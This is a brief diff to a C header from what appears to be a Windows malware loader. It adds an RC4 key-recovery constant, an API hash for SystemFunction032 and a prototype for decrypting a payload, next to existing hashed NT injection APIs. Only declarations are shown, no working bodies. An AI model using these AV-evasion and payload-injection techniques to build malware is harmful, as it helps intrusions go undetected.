@@ -11,6 +11,10 @@
 #include "Debug.h"
 
 
+#define HINT_BYTE 0x3C
+#define KEY_SIZE 16
+
+
 /*-------------[String Hash]-------------*/
 
 
@@ -21,6 +25,8 @@
 #define NtCreateThreadEx_DJB2           0x8EC0B84A
 #define NtWaitForSingleObject_DJB2      0x6299AD3D
 #define NtOpenProcess_DJB2              0x837FAFFE
+#define SystemFunction032_DJB2  0x8CFD40A8
+
 
 #define NTDLLDLL_DJB2                   0x0141C4EE            
 #define KERNEL32DLL_JOAA				0xFD2AD9BD
@@ -152,6 +158,8 @@ FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash);
 
 PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size);
 CHAR _toUpper(CHAR C);
+
+BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize);
 
 /*-------------[COPYSTUFF]-------------*/
 
